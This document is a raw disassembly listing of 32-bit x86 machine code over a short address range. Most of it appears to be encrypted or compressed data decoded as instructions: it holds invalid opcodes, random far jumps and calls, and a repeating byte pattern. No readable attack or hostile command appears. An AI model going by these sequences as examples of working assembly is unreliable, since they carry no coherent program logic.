  41d263:	imul   ecx,DWORD PTR [ebx+0x7b73b6fb],0xcadbf8e4
  41d26d:	scas   al,BYTE PTR es:[edi]
  41d26e:	test   BYTE PTR [edx-0x36],0xdc
  41d272:	and    cl,BYTE PTR ss:[eax]
  41d275:	test   BYTE PTR [ecx-0x208cf0d8],dh
  41d27b:	and    bh,BYTE PTR [esi-0x57992357]
  41d281:	ret    0xd1c2
  41d284:	cld    
  41d285:	outs   dx,BYTE PTR ds:[esi]
  41d286:	fistp  WORD PTR [edx+0x5ddd7434]
  41d28c:	pop    ss
  41d28d:	call   edx
  41d28f:	sti    
  41d290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d291:	inc    DWORD PTR [edx]
  41d293:	sub    BYTE PTR [edx+0x52243701],dh
  41d299:	mov    DWORD PTR [eax+0xa3b1736],esi
  41d29f:	mov    ds:0x906a31ff,eax
  41d2a4:	inc    esi
  41d2a5:	ins    BYTE PTR es:[edi],dx
  41d2a6:	mov    ch,BYTE PTR [ecx-0x4b]
  41d2a9:	and    BYTE PTR [edx+edx*2],bh
  41d2ac:	imul   esp,eax,0xffffffa1
  41d2af:	loope  0x41d31c
  41d2b1:	cmp    eax,0x1b2d2195
  41d2b6:	popfw  
  41d2b8:	shl    BYTE PTR [eax*1+0x613bea17],1
  41d2bf:	or     BYTE PTR [edi+eax*1-0x731041bf],ah
  41d2c6:	int3   
  41d2c7:	std    
  41d2c8:	int3   
  41d2c9:	js     0x41d326
  41d2cb:	mov    cl,0xf9
  41d2cd:	sbb    DWORD PTR [ecx-0x2c],edi
  41d2d0:	sbb    cl,ah
  41d2d2:	sub    ecx,0xffffff93
  41d2d5:	inc    esi
  41d2d6:	push   ds
  41d2d7:	add    eax,0x48f8cac
  41d2dc:	push   edx
  41d2dd:	inc    ebx
  41d2de:	or     BYTE PTR [edi+0x64e212c7],dh
  41d2e4:	mov    ss,WORD PTR [esi-0x8]
  41d2e7:	outs   dx,BYTE PTR ds:[esi]
  41d2e8:	xchg   ecx,eax
  41d2e9:	mov    ch,0xcb
  41d2eb:	ror    BYTE PTR [esi],cl
  41d2ed:	jmp    0xdc48:0xc41b436
  41d2f4:	adc    eax,0x7744405e
  41d2f9:	fcmovnbe st,st(3)
  41d2fb:	adc    dh,bl
  41d2fd:	mov    dh,BYTE PTR [esi]
  41d2ff:	pop    ecx
  41d300:	js     0x41d34d
  41d302:	addr16 sub eax,0xb65041fd
  41d308:	jmp    0xeae1:0x2861f6ee
  41d30f:	sbb    ah,cl
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx+0x32],0x75
  41d382:	stos   BYTE PTR es:[edi],al
  41d383:	pusha  
  41d384:	retf   
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0x52000001
  41d38d:	sbb    al,0xaa
  41d38f:	mov    ch,0x35
  41d391:	imul   esp,DWORD PTR [esi+0x8],0x3e47db67
  41d398:	aam    0xa9
  41d39a:	addr16 xchg edx,eax
  41d39c:	mov    bh,0x5d
  41d39e:	xchg   edi,eax
  41d39f:	xchg   ecx,eax
  41d3a0:	mov    ds:0xdaba1942,eax
  41d3a5:	push   cs
  41d3a6:	ss inc ebp
  41d3a8:	icebp  
  41d3a9:	(bad)  
  41d3aa:	xor    ah,ch
  41d3ac:	les    esi,FWORD PTR [edi-0x62]
  41d3af:	pop    eax
  41d3b0:	ds in  eax,dx
  41d3b2:	xchg   BYTE PTR [edi],ah
  41d3b4:	mov    ds:0xe9ed179d,al
  41d3b9:	jnp    0x41d3c2
  41d3bb:	je     0x41d361
  41d3bd:	clc    
  41d3be:	(bad)  
  41d3bf:	jmp    0xcdfc:0x496720b0
  41d3c6:	dec    ecx
  41d3c7:	jne    0x41d3e0
  41d3c9:	sbb    eax,0x364a46f3
  41d3ce:	mov    ch,0x5
  41d3d0:	adc    BYTE PTR [esi-0x5bd17659],dh
  41d3d6:	(bad)  
  41d3d7:	jo     0x41d374
  41d3d9:	sub    cl,BYTE PTR [eax+0x48878b0b]
  41d3df:	sub    BYTE PTR ds:0x875785ec,dl
  41d3e5:	cdq    
  41d3e6:	jne    0x41d3aa
  41d3e8:	sahf   
  41d3e9:	add    eax,0xf4559d77
  41d3ee:	push   esi
  41d3ef:	fisub  WORD PTR [ecx]
  41d3f1:	sar    esi,1
  41d3f3:	inc    esp
  41d3f4:	icebp  
  41d3f5:	inc    esp
  41d3f6:	repnz push edx
  41d3f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3f9:	les    esp,FWORD PTR [edx-0x486e1014]
  41d3ff:	leave  
  41d400:	data16 je 0x41d3cf
  41d403:	repnz rcr BYTE PTR [ebp+0x2d94e5d9],1
  41d40a:	cmp    BYTE PTR [ebp+0x2f45fb6c],dl
  41d410:	les    esi,FWORD PTR [edx+ecx*4+0x70]
  41d414:	std    
  41d415:	pop    esi
  41d416:	hlt    
  41d417:	scas   al,BYTE PTR es:[edi]
  41d418:	push   ss
  41d419:	cli    
  41d41a:	arpl   WORD PTR ds:0x48ce36c4,si
  41d420:	test   BYTE PTR [ecx-0x4a507eb5],dh
  41d426:	pop    edx
  41d427:	mov    bh,0x97
  41d429:	xchg   ebp,eax
  41d42a:	add    dl,BYTE PTR [edi]
  41d42c:	cmc    
  41d42d:	add    BYTE PTR [esi-0x669bae1f],0x56
  41d434:	pop    ebp
  41d435:	mov    ds:0xb53aab22,al
  41d43a:	mov    ebp,esp
  41d43c:	mov    bl,0xfc
  41d43e:	out    dx,eax
  41d43f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d440:	sbb    BYTE PTR [eax+0x7],0xec
  41d444:	fist   WORD PTR [edx-0x3c33986e]
  41d44a:	or     ebx,DWORD PTR [eax+ecx*8-0x1c100111]
  41d451:	dec    ebp
  41d452:	mov    ebx,0xe78d03f1
  41d457:	mov    ds:0x6da729b0,al
  41d45c:	pop    ss
  41d45d:	int3   
  41d45e:	push   0x412b3b45
  41d463:	and    al,0xe9
  41d465:	call   0xebd353ac
  41d46a:	pop    ds
  41d46b:	dec    ecx
  41d46c:	scas   eax,DWORD PTR es:[edi]
  41d46d:	cmc    
  41d46e:	int3   
  41d46f:	dec    sp
  41d471:	sti    
  41d472:	xlat   BYTE PTR ds:[ebx]
  41d473:	mov    ds:0xa4df5317,eax
  41d478:	sub    eax,DWORD PTR [edi+0x4ecfcd9c]
  41d47e:	jle    0x41d4ca
  41d480:	call   0xf18ca7cd
  41d485:	cs cmp eax,0x99554d2c
  41d48b:	stos   BYTE PTR es:[edi],al
  41d48c:	cdq    
  41d48d:	cmp    eax,0x51f63a
	...
  41d4f2:	add    BYTE PTR [eax],al
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd09a:0xdfa84589
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0x37000001
  41d50d:	jae    0x41d545
  41d50f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d511:	das    
  41d512:	retf   0xf186
  41d515:	xor    BYTE PTR [eax],bh
  41d517:	or     BYTE PTR [ecx],cl
  41d519:	sub    ebp,DWORD PTR [ecx]
  41d51b:	lock (bad) 
  41d51d:	into   
  41d51e:	cdq    
  41d51f:	jae    0x41d562
  41d521:	mov    bh,ch
  41d523:	push   esi
  41d524:	in     al,dx
  41d525:	lods   al,BYTE PTR ds:[esi]
  41d526:	or     edi,0xffffffa1
  41d529:	dec    ebx
  41d52a:	adc    eax,0xd48bde34
  41d52f:	pop    edx
  41d530:	cmp    DWORD PTR fs:[ebp+0x4a47f6b9],ecx
  41d537:	loopne 0x41d563
  41d539:	addr16 hlt 
  41d53b:	sahf   
  41d53c:	push   ecx
  41d53d:	gs mov dh,0x64
  41d540:	xchg   BYTE PTR [ecx],ah
  41d542:	pop    ecx
  41d543:	inc    esi
  41d544:	and    eax,0xf9b7c847
  41d549:	icebp  
  41d54a:	add    edx,edi
  41d54c:	or     BYTE PTR [edi+ecx*8],bl
  41d54f:	inc    edx
  41d550:	dec    eax
  41d551:	enter  0x151b,0x75
  41d555:	rcr    BYTE PTR gs:[eax],1
  41d558:	inc    BYTE PTR [eax+edx*8]
  41d55b:	push   cs
  41d55c:	and    esi,ebx
  41d55e:	jns    0x41d54f
  41d560:	adc    BYTE PTR [ebx-0x67924c30],cl
  41d566:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41d568:	adc    eax,ecx
  41d56a:	ja     0x41d553
  41d56c:	jmp    0x2923fb6e
  41d571:	push   0xeff0f76f
  41d576:	jle    0x41d517
  41d578:	out    0x9,al
  41d57a:	xchg   BYTE PTR [ebx+ebx*8-0x1de60403],cl
  41d581:	mov    BYTE PTR [ecx],0xf3
  41d584:	adc    dl,0xf1
  41d587:	mov    edx,0xd20584f6
  41d58c:	sbb    DWORD PTR [ebp-0x56],esi
  41d58f:	fidivr WORD PTR [ebx+0x14ecb9a6]
  41d595:	arpl   WORD PTR [edi],di
  41d597:	out    dx,eax
  41d598:	xlat   BYTE PTR ds:[ebx]
  41d599:	call   0xb1d541cd
  41d59e:	sahf   
  41d59f:	aad    0xf5
  41d5a1:	sub    al,BYTE PTR [ebp-0x15c59045]
  41d5a7:	(bad)  
  41d5a8:	aam    0x1d
  41d5aa:	adc    BYTE PTR [edi+0x7ea7bfc4],0x3b
  41d5b1:	adc    ebp,DWORD PTR [ecx-0x13]
  41d5b4:	(bad)  
  41d5b5:	dec    ecx
  41d5b6:	idiv   BYTE PTR [eax-0x24]
  41d5b9:	outs   dx,BYTE PTR ds:[esi]
  41d5ba:	mov    ?,WORD PTR [edx]
  41d5bc:	sahf   
  41d5bd:	mov    al,ds:0x742e167e
  41d5c2:	fisubr WORD PTR [edi-0x58468ae8]
  41d5c8:	aam    0xab
  41d5ca:	adc    edi,ecx
  41d5cc:	adc    eax,0xe66f4a35
  41d5d1:	mov    edi,0x719facc0
  41d5d6:	test   al,0x74
  41d5d8:	mov    edx,0xa12f33ff
  41d5dd:	sub    ebx,esi
  41d5df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5e0:	scas   al,BYTE PTR es:[edi]
  41d5e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5e2:	sti    
  41d5e3:	pop    esp
  41d5e4:	pusha  
  41d5e5:	(bad)  
  41d5e6:	stos   BYTE PTR es:[edi],al
  41d5e7:	inc    ebx
  41d5e8:	mov    dl,0x17
  41d5ea:	test   al,0x76
  41d5ec:	mov    bh,0xeb
  41d5ee:	in     al,dx
  41d5ef:	adc    al,0xb0
  41d5f1:	popf   
  41d5f2:	test   al,0x72
  41d5f4:	call   0x804f:0x3cffd64
  41d5fb:	mov    eax,ds:0x95163283
  41d600:	adc    BYTE PTR [esi+esi*2+0x41cb2df3],bl
  41d607:	gs ret 
  41d609:	retf   0xf99f
  41d60c:	jg     0x41d5e4
  41d60e:	jge    0x41d5fd
  41d610:	jp     0x41d612
	...
  41d672:	add    BYTE PTR [eax],al
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x7066e435
  41d681:	(bad)  
  41d682:	shl    ah,cl
  41d684:	aad    0x38
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    eax,0x92000001
  41d68d:	adc    esi,DWORD PTR [ecx+ebx*8+0x52]
  41d691:	outs   dx,BYTE PTR ds:[esi]
  41d692:	iret   
  41d693:	or     DWORD PTR [esi*4+0x799f5734],ecx
  41d69a:	scas   eax,DWORD PTR es:[edi]
  41d69b:	sub    al,BYTE PTR [ecx-0x295c782b]
  41d6a1:	cmp    dl,BYTE PTR [esi-0x5b017193]
  41d6a7:	mov    ds:0xdb0825f7,al
  41d6ac:	test   al,0x6
  41d6ae:	cwde   
  41d6af:	mov    esp,0x2f81a676
  41d6b4:	shl    BYTE PTR [edi-0x30],cl
  41d6b7:	add    BYTE PTR [ecx+ebx*1],ah
  41d6ba:	in     eax,dx
  41d6bb:	imul   ebp,ecx,0xc30f6cd9
  41d6c1:	clc    
  41d6c2:	clc    
  41d6c3:	les    edx,FWORD PTR [esp+esi*4-0x39]
  41d6c7:	into   
  41d6c8:	inc    ecx
  41d6c9:	pop    ss
  41d6ca:	icebp  
  41d6cb:	mov    ds:0x52d9b9b3,eax
  41d6d0:	jb     0x41d711
  41d6d2:	xor    edi,DWORD PTR [esi-0x43]
  41d6d5:	xchg   esi,eax
  41d6d6:	mov    ecx,0x64de93f5
  41d6db:	adc    ebp,DWORD PTR [ecx-0x1d]
  41d6de:	shr    DWORD PTR [ebx-0xd],cl
  41d6e1:	or     eax,0xad016dac
  41d6e6:	and    eax,0xa4b36d01
  41d6eb:	xchg   ecx,eax
  41d6ec:	stc    
  41d6ed:	lods   eax,DWORD PTR ds:[esi]
  41d6ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6ef:	add    eax,0x889da2a9
  41d6f4:	push   ds
  41d6f5:	int    0x5f
  41d6f7:	dec    ebp
  41d6f8:	in     eax,dx
  41d6f9:	pop    edx
  41d6fa:	ins    BYTE PTR es:[edi],dx
  41d6fb:	jbe    0x41d696
  41d6fd:	add    esp,edi
  41d6ff:	sbb    eax,0xb318961c
  41d704:	ja     0x41d771
  41d706:	and    BYTE PTR [edx+0x6a],cl
  41d709:	inc    ebp
  41d70a:	hlt    
  41d70b:	je     0x41d6b1
  41d70d:	fisttp WORD PTR [esi+0x174e6d0]
  41d713:	mov    WORD PTR [esi],es
  41d715:	fidivr DWORD PTR [ecx+0x17]
  41d718:	add    edi,esi
  41d71a:	ds pop es
  41d71c:	adc    BYTE PTR [esi+0x67],0x5a
  41d720:	sbb    eax,0xcad8ec9c
  41d725:	test   al,0xdf
  41d727:	hlt    
  41d728:	sbb    al,0xb0
  41d72a:	outs   dx,DWORD PTR ds:[esi]
  41d72b:	neg    BYTE PTR [esi]
  41d72d:	stc    
  41d72e:	add    DWORD PTR [eax-0x72d97c09],edi
  41d734:	es jmp 0x41d6be
  41d737:	bound  esi,QWORD PTR [ebx+edi*2+0x61d77bcc]
  41d73e:	std    
  41d73f:	out    0x4,eax
  41d741:	mov    bl,BYTE PTR [ecx-0x2719be46]
  41d747:	sbb    DWORD PTR [ebx+eax*2],esi
  41d74a:	inc    ebx
  41d74b:	adc    al,0x2f
  41d74d:	(bad)  
  41d74e:	mov    bl,0x76
  41d750:	fnsave [esp+eax*1]
  41d753:	jne    0x41d749
  41d755:	aaa    
  41d756:	xlat   BYTE PTR ds:[ebx]
  41d757:	add    BYTE PTR [ebx+0x51],bl
  41d75a:	ds dec esp
  41d75c:	cmp    cl,BYTE PTR [ecx-0x12]
  41d75f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d760:	pushf  
  41d761:	xchg   ebp,eax
  41d762:	sti    
  41d763:	out    0xf7,eax
  41d765:	sbb    ax,0x851
  41d769:	fcomp  DWORD PTR [edi-0x360dc4b7]
  41d76f:	out    0x3d,eax
  41d771:	xchg   ebx,eax
  41d772:	sbb    BYTE PTR [eax+0x2ebcc994],bl
  41d778:	jo     0x41d745
  41d77a:	xor    ecx,DWORD PTR [ebx+eiz*2]
  41d77d:	bound  ebp,QWORD PTR [esi+ebx*8-0x38bdc799]
  41d784:	rol    BYTE PTR gs:[ecx+esi*1+0x6c],0x2b
  41d78a:	(bad)  
  41d78b:	in     al,dx
  41d78c:	add    bh,BYTE PTR [ebx]
  41d78e:	sbb    BYTE PTR [esi+0xc9],ah
	...
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	in     eax,0x50
  41d802:	es mov eax,0x139da
  41d808:	add    eax,0x17000001
  41d80d:	fdivr  QWORD PTR [eax-0x50ed2139]
  41d813:	stos   BYTE PTR es:[edi],al
  41d814:	add    ch,ah
  41d816:	xchg   esp,eax
  41d817:	pop    esi
  41d818:	push   ds
  41d819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d81a:	mov    ds:0x1de4f61d,al
  41d81f:	mov    dl,0xd2
  41d821:	push   ds
  41d822:	sar    DWORD PTR [eax],cl
  41d824:	jge    0x41d80f
  41d826:	fist   WORD PTR [esi+0xf]
  41d829:	dec    esi
  41d82b:	pop    esp
  41d82c:	adc    ecx,DWORD PTR [ebp-0x3066185c]
  41d832:	in     al,dx
  41d833:	sub    DWORD PTR [ecx-0x371c4bd8],ecx
  41d839:	sub    al,0xd1
  41d83b:	pop    es
  41d83c:	xchg   esp,eax
  41d83d:	pusha  
  41d83e:	inc    esi
  41d83f:	or     BYTE PTR [eax],bh
  41d841:	(bad)  
  41d842:	jp     0x41d7e1
  41d844:	pop    ss
  41d845:	sub    DWORD PTR ds:0x722d8110,esi
  41d84b:	das    
  41d84c:	jmp    0x534c:0xff85aa3c
  41d853:	push   0x15
  41d855:	push   esi
  41d856:	mov    al,ds:0x91885882
  41d85b:	jg     0x41d837
  41d85d:	pusha  
  41d85e:	sbb    DWORD PTR [edx+0x11bedfc2],edx
  41d864:	cmp    esp,edi
  41d866:	mov    BYTE PTR [esi-0x52],0x41
  41d86a:	jle    0x41d82d
  41d86c:	cli    
  41d86d:	dec    ecx
  41d86e:	mov    ds:0x1bc98590,al
  41d873:	sbb    BYTE PTR [edx+0x5],0x79
  41d877:	lahf   
  41d878:	retf   0x7f67
  41d87b:	mov    edi,DWORD PTR [eax-0x5e4f10f3]
  41d881:	dec    esp
  41d883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d884:	xor    edi,DWORD PTR [ebp+0x6ee3e885]
  41d88a:	add    DWORD PTR [ecx-0x3a],ebx
  41d88d:	sub    eax,0xb61ff945
  41d892:	and    BYTE PTR [ebp+0x4],dh
  41d895:	loope  0x41d906
  41d897:	mov    esi,0x3c921ec1
  41d89c:	jmp    0x41d830
  41d89e:	jnp    0x41d85d
  41d8a0:	xchg   ecx,eax
  41d8a1:	jbe    0x41d879
  41d8a3:	sub    dl,BYTE PTR [eax-0x2b]
  41d8a6:	inc    ebx
  41d8a7:	push   edi
  41d8a8:	popf   
  41d8a9:	leave  
  41d8aa:	dec    ecx
  41d8ab:	test   ah,bl
  41d8ad:	and    DWORD PTR [esi],esp
  41d8af:	pop    ebx
  41d8b0:	ror    ch,0x2b
  41d8b3:	xor    eax,0x1450dc93
  41d8b8:	ins    DWORD PTR es:[edi],dx
  41d8b9:	push   0x9942aa5d
  41d8be:	mov    ebp,ebp
  41d8c0:	pop    ss
  41d8c1:	psubq  mm5,QWORD PTR [esi-0x45]
  41d8c5:	mul    DWORD PTR [ecx-0x71ae07f8]
  41d8cb:	push   esi
  41d8cc:	out    0xff,eax
  41d8ce:	cmp    al,0x8b
  41d8d0:	push   0x7e
  41d8d2:	sub    bh,BYTE PTR [edi-0x40]
  41d8d5:	mov    bh,0xb6
  41d8d7:	mov    ecx,0x37034579
  41d8dc:	mov    cl,0xa1
  41d8de:	dec    ebp
  41d8df:	fdivr  st,st(1)
  41d8e1:	xor    DWORD PTR [ebx-0x5e],esi
  41d8e4:	cmp    bl,BYTE PTR [ebp+0x46]
  41d8e7:	jns    0x41d8f9
  41d8e9:	push   ecx
  41d8ea:	popf   
  41d8eb:	sbb    eax,0xeae512b4
  41d8f0:	rol    bh,1
  41d8f2:	inc    edi
  41d8f3:	rcl    DWORD PTR [ecx-0x52c4609],1
  41d8f9:	jnp    0x41d8e1
  41d8fb:	mov    ds:0x6a0c3dc,eax
  41d900:	in     eax,dx
  41d901:	jae    0x41d982
  41d903:	daa    
  41d904:	bnd jnp 0x41d8c9
  41d907:	sub    al,0x20
  41d909:	xchg   edi,eax
  41d90a:	jo     0x41d8df
  41d90c:	sbb    eax,0x821d88a4
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs popf 
  41d981:	jle    0x41d99a
  41d983:	sbb    edi,0x3a
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    eax,0x9b000001
  41d98d:	xchg   ebx,eax
  41d98e:	jns    0x41d9f1
  41d990:	xor    BYTE PTR [ebx-0x1f7d0b03],0xb
  41d997:	add    BYTE PTR [ebx],dh
  41d999:	inc    ebp
  41d99a:	loop   0x41d9de
  41d99c:	mov    al,0xca
  41d99e:	mov    dl,0x5b
  41d9a0:	sbb    edx,DWORD PTR [eax]
  41d9a2:	and    eax,0x38c15e9b
  41d9a7:	dec    edi
  41d9a8:	inc    ebx
  41d9a9:	mov    edi,0xe5b101e2
  41d9ae:	ror    DWORD PTR [edx+0x7bf55420],cl
  41d9b4:	retf   
  41d9b5:	nop
  41d9b6:	cli    
  41d9b7:	push   edx
  41d9b8:	into   
  41d9b9:	mov    ds:0x31bfb8b8,al
  41d9be:	inc    ecx
  41d9bf:	sub    DWORD PTR [esp+esi*1+0x23b00cd7],esi
  41d9c6:	jg     0x41d9de
  41d9c8:	test   ebx,edi
  41d9ca:	aas    
  41d9cb:	jg     0x41d979
  41d9cd:	icebp  
  41d9ce:	mov    bh,BYTE PTR [ebp+0x9]
  41d9d1:	mov    edx,0x41cba01c
  41d9d6:	ins    DWORD PTR es:[edi],dx
  41d9d7:	adc    esi,ebx
  41d9d9:	outs   dx,BYTE PTR ds:[esi]
  41d9da:	into   
  41d9db:	retf   0x9385
  41d9de:	sbb    edi,0x3707a8bb
  41d9e4:	call   0x8536:0x62074704
  41d9eb:	or     BYTE PTR ds:0xebd6227a,dl
  41d9f1:	es push cs
  41d9f3:	in     eax,0xb4
  41d9f5:	sbb    al,0xf8
  41d9f7:	sbb    DWORD PTR [eax-0x7daad56e],eax
  41d9fd:	in     eax,dx
  41d9fe:	pop    eax
  41d9ff:	sub    DWORD PTR [ebx-0x13],eax
  41da02:	mov    WORD PTR [ebp-0x256bd819],es
  41da08:	mov    esi,0x4c92071c
  41da0d:	leave  
  41da0e:	or     BYTE PTR [esp+ebx*8+0x5e],0x9e
  41da13:	push   ds
  41da14:	(bad)  
  41da15:	out    dx,eax
  41da16:	jb     0x41da1c
  41da18:	loopne 0x41da30
  41da1a:	loopne 0x41da2e
  41da1c:	gs xchg ecx,eax
  41da1e:	shl    ecx,cl
  41da20:	int3   
  41da21:	sbb    ch,al
  41da23:	rcr    DWORD PTR [esi],cl
  41da25:	mov    eax,DWORD PTR [esi]
  41da27:	es add al,0x9
  41da2a:	ror    BYTE PTR [edx+0xe],1
  41da2d:	mov    ss,WORD PTR [edi+0x69]
  41da30:	js     0x41d9e7
  41da32:	sbb    dl,dh
  41da34:	repnz scas al,BYTE PTR es:[edi]
  41da36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da37:	mov    ds:0xd402c7b7,eax
  41da3c:	inc    edi
  41da3d:	pop    edx
  41da3e:	mov    ah,ch
  41da40:	jns    0x41d9ec
  41da42:	push   eax
  41da43:	pop    ss
  41da44:	imul   ebx,DWORD PTR [ebp+0x56],0x5c41697f
  41da4b:	imul   esp,esp,0xffffff9b
  41da4e:	dec    edi
  41da4f:	push   0x5
  41da51:	sub    ecx,edi
  41da53:	push   0x6e42b0b0
  41da58:	dec    esp
  41da59:	jcxz   0x41dac8
  41da5c:	cmp    esi,eax
  41da5e:	sub    dl,dl
  41da60:	pushf  
  41da61:	ret    0x7241
  41da64:	add    eax,eax
  41da66:	mov    ebp,0x31e1f873
  41da6b:	mov    ecx,0xea52a84c
  41da70:	cmc    
  41da71:	xchg   ecx,eax
  41da72:	adc    DWORD PTR ds:0x4035740f,eax
  41da78:	pop    es
  41da79:	dec    edx
  41da7a:	pop    ecx
  41da7b:	daa    
  41da7c:	pushf  
  41da7d:	repnz outs dx,DWORD PTR ds:[esi]
  41da7f:	jmp    0x8aa1:0x3da96e20
  41da86:	mov    eax,ds:0xd714f612
  41da8b:	bound  esp,QWORD PTR [ebx]
  41da8d:	or     dh,BYTE PTR [ebx+0xafcb]
	...
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x3c
  41db01:	cmp    eax,0x3be48d0a
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0xa8000001
  41db0d:	outs   dx,DWORD PTR ds:[esi]
  41db0e:	xchg   ecx,eax
  41db0f:	mov    dh,0xf0
  41db11:	pop    eax
  41db12:	or     BYTE PTR [edi],ch
  41db14:	jmp    0xe129:0x3f84347f
  41db1b:	rcr    DWORD PTR [edx-0x59e15f09],1
  41db21:	adc    DWORD PTR [ebp-0x7c2025d7],0x34f05e44
  41db2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db2c:	mov    ah,0xff
  41db2e:	loope  0x41dab9
  41db30:	cmc    
  41db31:	jecxz  0x41db36
  41db33:	inc    ecx
  41db34:	stos   BYTE PTR es:[edi],al
  41db35:	sar    bh,cl
  41db37:	ja     0x41db3c
  41db39:	addr16 pop ebx
  41db3b:	inc    esp
  41db3c:	dec    eax
  41db3d:	loope  0x41db5f
  41db3f:	cmp    dh,dl
  41db41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db42:	imul   ecx,edx,0xf45f85d5
  41db48:	cs ret 
  41db4a:	into   
  41db4b:	and    ebp,DWORD PTR [edi+0x38d53d84]
  41db51:	fs mov ch,0x95
  41db54:	mov    cl,al
  41db56:	dec    edx
  41db57:	xchg   ebx,eax
  41db58:	je     0x41db2e
  41db5a:	push   ds
  41db5b:	push   eax
  41db5c:	adc    edx,DWORD PTR [ecx*2-0x6a47f64c]
  41db63:	adc    edx,edx
  41db65:	mov    ds,eax
  41db67:	mov    al,0x45
  41db69:	cmc    
  41db6a:	cli    
  41db6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db6c:	scas   eax,DWORD PTR es:[edi]
  41db6d:	add    DWORD PTR [esi-0x3466cff5],esp
  41db73:	mov    ds:0xf7e1cc36,eax
  41db78:	add    ch,BYTE PTR ds:0x77a8a948
  41db7e:	dec    esp
  41db7f:	ins    BYTE PTR es:[edi],dx
  41db80:	enter  0x788d,0xe3
  41db84:	bound  esp,QWORD PTR [esi+0x4fd13183]
  41db8a:	adc    BYTE PTR [ebx+ebx*8-0x62c2eed8],cl
  41db91:	jmp    0x41db39
  41db93:	into   
  41db94:	rol    BYTE PTR [esi+0x3e],0x3f
  41db98:	sub    eax,0x7e56a612
  41db9d:	pushf  
  41db9e:	mov    al,0x44
  41dba0:	xchg   ebp,eax
  41dba1:	ror    DWORD PTR [esi+eiz*4-0xd62e324],1
  41dba8:	je     0x41db9c
  41dbaa:	out    0x5c,al
  41dbac:	push   ebp
  41dbad:	push   ss
  41dbae:	mov    al,ds:0xb7824448
  41dbb3:	pop    esi
  41dbb4:	sbb    eax,0xb0faa12b
  41dbb9:	push   es
  41dbba:	lods   eax,DWORD PTR ds:[esi]
  41dbbb:	mov    edi,DWORD PTR [esi-0x5f61b186]
  41dbc1:	lods   eax,DWORD PTR ds:[esi]
  41dbc2:	das    
  41dbc3:	loop   0x41dc35
  41dbc5:	into   
  41dbc6:	cmp    BYTE PTR [esi+0x1239399],bh
  41dbcc:	push   ds
  41dbcd:	stos   BYTE PTR es:[di],al
  41dbcf:	jnp    0x41dbc9
  41dbd1:	clc    
  41dbd2:	ja     0x41dc03
  41dbd4:	mov    cs,WORD PTR [eax]
  41dbd6:	shl    dl,cl
  41dbd8:	sub    ecx,DWORD PTR [ebx+0x1dd3e57f]
  41dbde:	jp     0x41dc28
  41dbe0:	scas   al,BYTE PTR es:[edi]
  41dbe1:	add    bh,ch
  41dbe3:	jge    0x41dbc1
  41dbe5:	mov    ds:0x8011c840,eax
  41dbea:	repz pushf 
  41dbec:	xchg   esi,eax
  41dbed:	dec    ecx
  41dbee:	and    al,0x48
  41dbf0:	outs   dx,BYTE PTR ds:[esi]
  41dbf1:	(bad)  
  41dbf2:	mov    esp,0x1210ecb2
  41dbf7:	fwait
  41dbf8:	scas   al,BYTE PTR es:[edi]
  41dbf9:	arpl   WORD PTR [ebx+ebx*4+0x524f335c],sp
  41dc00:	or     eax,0x88c376df
  41dc05:	mov    eax,ds:0x29b61199
  41dc0a:	imul   ecx,DWORD PTR [ebx+0x41],0xffffffd8
  41dc0e:	add    al,0x35
  41dc10:	aad    0x0
	...
  41dc72:	add    BYTE PTR [eax],al
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x5b0d050]
  41dc81:	popa   
  41dc82:	mov    esi,0x13ce96c
  41dc87:	add    BYTE PTR ds:0x3c000001,al
  41dc8d:	pushf  
  41dc8e:	xlat   BYTE PTR ds:[ebx]
  41dc8f:	fwait
